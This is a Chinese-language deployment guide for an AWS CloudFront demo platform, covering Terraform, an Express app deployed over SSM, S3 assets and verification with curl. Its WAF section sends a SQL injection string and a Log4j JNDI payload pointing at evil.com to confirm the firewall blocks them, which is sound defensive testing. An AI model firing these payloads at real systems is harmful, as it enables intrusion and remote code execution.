# CloudFront 全功能演示平台 — 部署指南

> **Account**: `434465421667` | **Profile**: `default` | **Region**: `ap-northeast-1` (Tokyo)
>
> **域名**: `unice.keithyu.cloud` | **VPC**: `vpc-086e15047c7f68e87` (keithyu-tokyo-vpc)

---

## 目录

1. [环境确认](#1-环境确认)
2. [Phase 1: Terraform 基础设施](#2-phase-1-terraform-基础设施)
3. [Phase 2: Express 应用部署](#3-phase-2-express-应用部署)
4. [Phase 3: 静态资源上传](#4-phase-3-静态资源上传)
5. [Phase 4: 端到端验证](#5-phase-4-端到端验证)
6. [Feature 逐项验证](#6-feature-逐项验证)
7. [费用估算](#7-费用估算)
8. [清理销毁](#8-清理销毁)
9. [故障排查](#9-故障排查)

---

## 1. 环境确认

部署前确认以下前提条件全部满足。

### 1.1 AWS CLI + Terraform

```bash
# 确认 AWS CLI 身份
aws sts get-caller-identity --profile default --output table
# 预期: Account = 434465421667, User = keith

# 确认 Terraform 版本
terraform version
# 预期: >= 1.5.0
```

### 1.2 已有资源清单

| 资源 | 值 | 验证命令 |
|------|-----|---------|
| VPC | `vpc-086e15047c7f68e87` (keithyu-tokyo-vpc) | `aws ec2 describe-vpcs --vpc-ids vpc-086e15047c7f68e87 --profile default --region ap-northeast-1 --query "Vpcs[0].State"` |
| Private Subnets | 3 个 (1a/1c/1d) | `aws ec2 describe-subnets --filters "Name=vpc-id,Values=vpc-086e15047c7f68e87" "Name=tag:Name,Values=*private*" --profile default --region ap-northeast-1 --query "Subnets[].SubnetId"` |
| NAT Gateway | `nat-07585e85b4e94b406` | `aws ec2 describe-nat-gateways --filter "Name=vpc-id,Values=vpc-086e15047c7f68e87" "Name=state,Values=available" --profile default --region ap-northeast-1 --query "NatGateways[0].NatGatewayId"` |
| ACM 证书 (us-east-1) | `*.keithyu.cloud` ISSUED | `aws acm describe-certificate --certificate-arn arn:aws:acm:us-east-1:434465421667:certificate/bc6230da-9d85-46de-abfb-c441647776f2 --profile default --region us-east-1 --query "Certificate.Status"` |
| Route53 Zone | `keithyu.cloud` | `aws route53 list-hosted-zones --profile default --query "HostedZones[?Name=='keithyu.cloud.'].Id"` |
| SSH Key Pair | `keith-secret` | `aws ec2 describe-key-pairs --key-names keith-secret --profile default --region ap-northeast-1 --query "KeyPairs[0].KeyName"` |

### 1.3 tfvars 确认

```bash
cd /root/keith-space/2026-project/longqi-cloudfront/terraform

# terraform.tfvars 已创建好，检查关键值
grep -E "vpc_id|private_subnet|s3_bucket|acm_cert|db_password" terraform.tfvars
```

> **安全提醒**: `terraform.tfvars` 包含 `db_password`，已在 `.gitignore` 中排除（如未排除请手动添加）。

---

## 2. Phase 1: Terraform 基础设施

### 2.1 初始化 + 预览

```bash
cd /root/keith-space/2026-project/longqi-cloudfront/terraform

# 初始化（下载 provider）
terraform init

# 格式化
terraform fmt -recursive

# 语法验证
terraform validate

# 查看执行计划（不实际创建）
terraform plan -out=tfplan
```

**预期输出**: `Plan: ~30 to add, 0 to change, 0 to destroy`

### 2.2 分阶段 Apply（推荐）

由于资源间有依赖，建议分阶段 apply 确保每阶段成功：

**阶段 A: 网络 + S3 + Database + Cognito + EC2 + ALB**（约 10-15 分钟）

```bash
terraform apply -target=module.network \
                -target=module.s3 \
                -target=module.database \
                -target=module.cognito \
                -target=module.ec2 \
                -target=module.alb \
                -auto-approve
```

验证：
```bash
# EC2 实例运行中
aws ec2 describe-instances \
  --filters "Name=tag:Name,Values=unice-demo" "Name=instance-state-name,Values=running" \
  --profile default --region ap-northeast-1 \
  --query "Reservations[0].Instances[0].[InstanceId,PrivateIpAddress,State.Name]" --output table

# ALB 健康检查通过（需等 2-3 分钟）
ALB_ARN=$(terraform output -raw alb_dns_name 2>/dev/null || echo "pending")
echo "ALB DNS: $ALB_ARN"
```

**阶段 B: WAF (us-east-1)**（约 1-2 分钟）

```bash
terraform apply -target=module.waf -auto-approve
```

**阶段 C: CloudFront Distribution**（约 5-10 分钟）

```bash
terraform apply -target=module.cloudfront -auto-approve
```

验证：
```bash
# Distribution 部署完成
DIST_ID=$(terraform output -raw cloudfront_distribution_id)
aws cloudfront get-distribution --id $DIST_ID --profile default \
  --query "Distribution.Status" --output text
# 预期: Deployed
```

**阶段 D: S3 OAC Bucket Policy + 剩余资源**

```bash
terraform apply -auto-approve
```

### 2.3 一步 Apply（熟悉后可直接使用）

```bash
terraform apply -auto-approve
```

> 首次完整 apply 约 15-20 分钟（Aurora Serverless v2 集群创建最耗时）。

### 2.4 查看输出

```bash
terraform output
```

关键输出：
```
site_url                    = "https://unice.keithyu.cloud"
cloudfront_distribution_id  = "E1XXXXXXXXXX"
alb_dns_name                = "internal-unice-demo-alb-xxx.ap-northeast-1.elb.amazonaws.com"
ec2_instance_id             = "i-0xxxxxxxxxx"
```

---

## 3. Phase 2: Express 应用部署

Terraform 创建的 EC2 只有占位应用（health/debug/delay）。需要部署完整的 Express 应用。

### 3.1 方式 A: 使用部署脚本（推荐）

```bash
cd /root/keith-space/2026-project/longqi-cloudfront

# 确保脚本可执行
chmod +x scripts/deploy-app.sh

# 设置环境变量（或让脚本从 terraform output 自动获取）
export REGION=ap-northeast-1
export BUCKET=$(cd terraform && terraform output -raw s3_bucket_id)
export INSTANCE_ID=$(cd terraform && terraform output -raw ec2_instance_id)

# 执行部署
./scripts/deploy-app.sh
```

### 3.2 方式 B: 手动通过 SSM 部署

```bash
cd /root/keith-space/2026-project/longqi-cloudfront

# 1. 打包应用
cd app && tar czf /tmp/unice-app.tar.gz --exclude='node_modules' --exclude='.env' . && cd ..

# 2. 上传到 S3
BUCKET=$(cd terraform && terraform output -raw s3_bucket_id)
aws s3 cp /tmp/unice-app.tar.gz s3://$BUCKET/deploy/unice-app.tar.gz --profile default --region ap-northeast-1

# 3. 通过 SSM 在 EC2 上部署
INSTANCE_ID=$(cd terraform && terraform output -raw ec2_instance_id)

aws ssm send-command \
  --instance-ids "$INSTANCE_ID" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=[
    "cd /opt/unice-app",
    "aws s3 cp s3://'$BUCKET'/deploy/unice-app.tar.gz /tmp/unice-app.tar.gz --region ap-northeast-1",
    "tar xzf /tmp/unice-app.tar.gz -C /opt/unice-app/",
    "cd /opt/unice-app && npm install --production",
    "pm2 restart all || pm2 start server.js --name unice-app",
    "pm2 save",
    "sleep 3 && curl -s http://127.0.0.1:3000/api/health"
  ]' \
  --profile default --region ap-northeast-1 \
  --query 'Command.CommandId' --output text
```

### 3.3 初始化数据库

```bash
# 通过 SSM 运行 seed 脚本
aws ssm send-command \
  --instance-ids "$INSTANCE_ID" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["cd /opt/unice-app && node seed.js"]' \
  --profile default --region ap-northeast-1 \
  --query 'Command.CommandId' --output text
```

### 3.4 验证应用

```bash
# 通过 CloudFront 访问健康检查
curl -s https://unice.keithyu.cloud/api/health | jq .

# 预期:
# {
#   "status": "ok",
#   "timestamp": "...",
#   "traceId": "...",
#   "env": { "dbConfigured": true, "cognitoConfigured": true }
# }
```

---

## 4. Phase 3: 静态资源上传

### 4.1 使用脚本上传

```bash
chmod +x scripts/deploy-static.sh
./scripts/deploy-static.sh
```

### 4.2 手动上传

```bash
BUCKET=$(cd terraform && terraform output -raw s3_bucket_id)

# 错误页面
aws s3 sync static/errors/ s3://$BUCKET/static/errors/ \
  --content-type "text/html" --cache-control "public, max-age=300" \
  --profile default --region ap-northeast-1

# CSS
aws s3 sync app/public/css/ s3://$BUCKET/static/css/ \
  --content-type "text/css" --cache-control "public, max-age=3600" \
  --profile default --region ap-northeast-1

# JavaScript
aws s3 sync app/public/js/ s3://$BUCKET/static/js/ \
  --content-type "application/javascript" --cache-control "public, max-age=3600" \
  --profile default --region ap-northeast-1

echo "静态资源上传完成"
```

### 4.3 验证 S3 → CloudFront 链路

```bash
# 通过 CloudFront 访问 S3 上的 CSS
curl -sI https://unice.keithyu.cloud/static/css/style.css | grep -i "x-cache\|content-type\|HTTP"
# 预期: HTTP/2 200, content-type: text/css, x-cache: Miss (首次) 或 Hit (二次)

# 直接访问 S3 应被拒绝
curl -sI "https://$BUCKET.s3.ap-northeast-1.amazonaws.com/static/css/style.css" | head -3
# 预期: HTTP/1.1 403 Forbidden
```

---

## 5. Phase 4: 端到端验证

### 5.1 基础连通性

```bash
echo "=== 1. DNS 解析 ==="
dig +short unice.keithyu.cloud

echo "=== 2. HTTPS 访问 ==="
curl -sI https://unice.keithyu.cloud/ | head -10

echo "=== 3. Health Check ==="
curl -s https://unice.keithyu.cloud/api/health | jq .

echo "=== 4. Debug Headers ==="
curl -s https://unice.keithyu.cloud/api/debug | jq '.cloudfront'

echo "=== 5. 商品 API ==="
curl -s https://unice.keithyu.cloud/api/products?page=1 | jq '.pagination'
```

### 5.2 缓存验证

```bash
echo "=== 首次请求 (Miss) ==="
curl -sI https://unice.keithyu.cloud/api/products?page=1 | grep -i x-cache

echo "=== 二次请求 (Hit) ==="
curl -sI https://unice.keithyu.cloud/api/products?page=1 | grep -i x-cache

echo "=== 不同 QS (Miss) ==="
curl -sI https://unice.keithyu.cloud/api/products?page=2 | grep -i x-cache

echo "=== 禁用缓存路径 (Always Miss) ==="
curl -sI https://unice.keithyu.cloud/api/debug | grep -i x-cache
curl -sI https://unice.keithyu.cloud/api/debug | grep -i x-cache
```

### 5.3 SSR 页面验证

```bash
# 首页（渲染 EJS 模板）
curl -s https://unice.keithyu.cloud/ | head -5
# 预期: <!DOCTYPE html>... Unice Demo

# 商品列表页
curl -s https://unice.keithyu.cloud/products | grep -c "product-card"
# 预期: >= 1 (有商品卡片)

# 调试页
curl -s https://unice.keithyu.cloud/debug | grep "X-Trace-Id"
```

---

## 6. Feature 逐项验证

### 6.1 VPC Origin (Internal ALB 零公网暴露)

```bash
# 直接访问 Internal ALB — 应超时（无公网入口）
ALB_DNS=$(cd terraform && terraform output -raw alb_dns_name)
curl --connect-timeout 5 http://$ALB_DNS/api/health 2>&1 || echo "无法直连 — VPC Origin 生效"

# 通过 CloudFront 访问 — 正常
curl -s https://unice.keithyu.cloud/api/health | jq .status
# 预期: "ok"
```

### 6.2 CloudFront Functions

```bash
# URL 重写: /products/1 → 被 Function 重写为 /api/products/1
curl -s https://unice.keithyu.cloud/products/1 | jq .product.name

# A/B 测试（需切换 default_cf_function 为 ab-test）:
# curl -sI https://unice.keithyu.cloud/ | grep -i x-ab-group

# Debug 端点查看所有 CloudFront 注入的 header
curl -s https://unice.keithyu.cloud/api/debug | jq '.cloudfront'
```

### 6.3 WAF 防护

```bash
# SQL 注入 — Common Rule Set 检测（Count 模式下仍返回 200）
curl -s -o /dev/null -w "%{http_code}" \
  "https://unice.keithyu.cloud/api/products?id=1%27%20OR%201%3D1"

# Log4j 漏洞利用 — Known Bad Inputs 拦截（Block 模式，返回 403）
curl -s -o /dev/null -w "%{http_code}" \
  -H 'User-Agent: ${jndi:ldap://evil.com/a}' \
  https://unice.keithyu.cloud/

# 延迟测试端点
curl -s https://unice.keithyu.cloud/api/delay/2000 | jq .actual
# 预期: ~2000 (ms)
```

### 6.4 签名 URL

```bash
# 直接访问 /premium/* — 应返回 403
curl -sI https://unice.keithyu.cloud/premium/sample.html | head -3
# 预期: HTTP/2 403

# 先上传测试文件
BUCKET=$(cd terraform && terraform output -raw s3_bucket_id)
echo "<h1>Premium Content</h1>" | aws s3 cp - s3://$BUCKET/premium/sample.html \
  --content-type "text/html" --profile default --region ap-northeast-1

# 通过 API 获取签名 URL（需要先登录获取 JWT）
# 见 hands-on/06-cloudfront-signed-url.md 完整步骤
```

### 6.5 自定义错误页面

```bash
# 404 — 品牌化错误页面
curl -s https://unice.keithyu.cloud/this-does-not-exist | head -5
# 预期: 自定义 HTML（包含 "Page Not Found"）

# 403 — 无签名访问 premium
curl -s https://unice.keithyu.cloud/premium/sample.html | head -5
# 预期: 自定义 403 HTML
```

### 6.6 UUID 追踪

```bash
# 首次请求 — 生成新 UUID
curl -sI https://unice.keithyu.cloud/api/health | grep -i x-trace-id
# 预期: X-Trace-Id: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

# 带 cookie 请求 — 保持同一 UUID
TRACE_ID=$(curl -sI https://unice.keithyu.cloud/api/health | grep -i x-trace-id | awk '{print $2}' | tr -d '\r')
curl -sI -b "x-trace-id=$TRACE_ID" https://unice.keithyu.cloud/api/health | grep -i x-trace-id
# 预期: 同一个 UUID
```

---

## 7. 费用估算

### 最小配置（默认 Feature Flags）

| 资源 | 月费用估算 |
|------|-----------|
| Aurora Serverless v2 (0.5 ACU min) | ~$43 |
| EC2 t3.medium (on-demand) | ~$38 |
| NAT Gateway (已有) | $0 (已有) |
| ALB | ~$16 + 数据传输 |
| CloudFront | 按请求量 (演示流量 < $1) |
| WAF Web ACL + 4 规则 | ~$9 |
| S3 存储 | < $1 |
| DynamoDB (按需) | < $1 |
| Cognito | 免费层 (50K MAU) |
| Route53 | $0.50/zone |
| **总计** | **~$108/月** |

### 节省费用建议

- 关闭 Aurora (`enable_aurora = false`): 省 ~$43/月
- 使用 t3.small 替代 t3.medium: 省 ~$19/月
- 不用时停止 EC2 实例: 按小时计费

---

## 8. 清理销毁

```bash
cd /root/keith-space/2026-project/longqi-cloudfront/terraform

# 预览将要销毁的资源
terraform plan -destroy

# 确认销毁（约 10-15 分钟）
terraform destroy -auto-approve

# 验证资源已清理
aws cloudfront list-distributions --profile default \
  --query "DistributionList.Items[?Aliases.Items[0]=='unice.keithyu.cloud'].Id" --output text
# 预期: 空
```

> **注意**: CloudFront Distribution 必须先 disable 再 delete，Terraform 会自动处理。Aurora 集群设置了 `skip_final_snapshot = true`，销毁时不创建快照。

---

## 9. 故障排查

### 9.1 Terraform Apply 失败

| 错误 | 原因 | 解决 |
|------|------|------|
| `Error creating CloudFront Distribution: CNAMEAlreadyExists` | 域名已绑定到其他 Distribution | `aws cloudfront list-distributions --query "DistributionList.Items[?Aliases.Items[0]=='unice.keithyu.cloud'].Id"` 找到并删除 |
| `Error creating Aurora cluster: DBSubnetGroupNotFoundFault` | Private Subnet 不在正确的 AZ | 确认 `private_subnet_ids` 至少覆盖 2 个不同 AZ |
| `Error creating VPC Origin: InvalidParameterValue` | ALB 不是 Internal 类型 | 确认 ALB `internal = true` |
| `InvalidParameter: The Certificate ARN is not in us-east-1` | ACM 证书区域不对 | CloudFront 只能使用 us-east-1 的证书 |

### 9.2 Express 应用问题

```bash
INSTANCE_ID=$(cd terraform && terraform output -raw ec2_instance_id)

# 查看 PM2 进程状态
aws ssm send-command --instance-ids "$INSTANCE_ID" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["pm2 status", "pm2 logs --lines 20"]' \
  --profile default --region ap-northeast-1 \
  --query 'Command.CommandId' --output text

# 查看 user_data 日志
aws ssm send-command --instance-ids "$INSTANCE_ID" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["cat /var/log/user-data.log | tail -50"]' \
  --profile default --region ap-northeast-1 \
  --query 'Command.CommandId' --output text
```

### 9.3 CloudFront 502/504

```bash
# 检查 ALB Target Group 健康状态
TG_ARN=$(aws elbv2 describe-target-groups --names unice-demo-tg \
  --profile default --region ap-northeast-1 --query "TargetGroups[0].TargetGroupArn" --output text)

aws elbv2 describe-target-health --target-group-arn "$TG_ARN" \
  --profile default --region ap-northeast-1 --output table
# 预期: State = healthy

# 检查安全组链
echo "=== VPC Origin SG ===" && aws ec2 describe-security-groups \
  --filters "Name=group-name,Values=unice-demo-vpc-origin-sg" \
  --profile default --region ap-northeast-1 \
  --query "SecurityGroups[0].IpPermissionsEgress[].{Port:FromPort,Dest:UserIdGroupPairs[0].GroupId}"

echo "=== ALB SG ===" && aws ec2 describe-security-groups \
  --filters "Name=group-name,Values=unice-demo-alb-sg" \
  --profile default --region ap-northeast-1 \
  --query "SecurityGroups[0].IpPermissions[].{Port:FromPort,Source:UserIdGroupPairs[0].GroupId}"
```

### 9.4 CloudFront 缓存不命中

```bash
# 检查 Cache Behavior 匹配
curl -sI https://unice.keithyu.cloud/api/products?page=1 | grep -i "x-cache\|age\|x-amz-cf-pop"

# 手动失效缓存
DIST_ID=$(cd terraform && terraform output -raw cloudfront_distribution_id)
aws cloudfront create-invalidation --distribution-id "$DIST_ID" --paths "/*" \
  --profile default --query 'Invalidation.Id' --output text
```

---

## 部署完成检查清单

- [ ] `terraform apply` 成功，无错误
- [ ] `curl https://unice.keithyu.cloud/api/health` 返回 `{"status":"ok"}`
- [ ] `curl https://unice.keithyu.cloud/` 返回 EJS 渲染的 HTML 页面
- [ ] `curl https://unice.keithyu.cloud/api/products` 返回商品数据
- [ ] `curl https://unice.keithyu.cloud/static/css/style.css` 返回 CSS
- [ ] `curl https://unice.keithyu.cloud/api/debug` 显示 CloudFront 注入的 header
- [ ] `/premium/*` 无签名返回 403
- [ ] 不存在的路径返回品牌化 404 页面
- [ ] WAF Log4j 测试返回 403

---

## 相关文档

| 文档 | 路径 | 说明 |
|------|------|------|
| 设计规格书 | `docs/superpowers/specs/2026-04-14-cloudfront-demo-platform-design.md` | 完整架构设计 |
| 实施计划 | `docs/superpowers/plans/2026-04-14-cloudfront-demo-platform-*.md` | 8 个 plan 分片 |
| Hands-on 01-12 | `hands-on/*.md` | 12 篇功能实操文档 |
| 部署脚本 | `scripts/deploy-app.sh` / `scripts/deploy-static.sh` | 自动化部署 |
